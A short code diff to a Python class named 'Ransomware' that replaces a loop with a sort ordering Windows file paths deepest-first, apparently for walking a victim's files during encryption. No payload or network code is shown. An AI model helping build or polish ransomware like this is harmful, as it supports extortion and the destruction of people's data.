@@ -59,11 +59,7 @@ class Ransomware():
    
    
    def inside_out(self, paths: List[str]) -> List[str]:
-      for path in paths:
-         if path.count("\\") >= paths[0].count("\\"):
-            paths.remove(path)
-            paths.insert(0, path)
-      return paths
+      return sorted(paths, key = lambda path: path.count("\\"), reverse = True)
    
    
    def show_message(self) -> None:
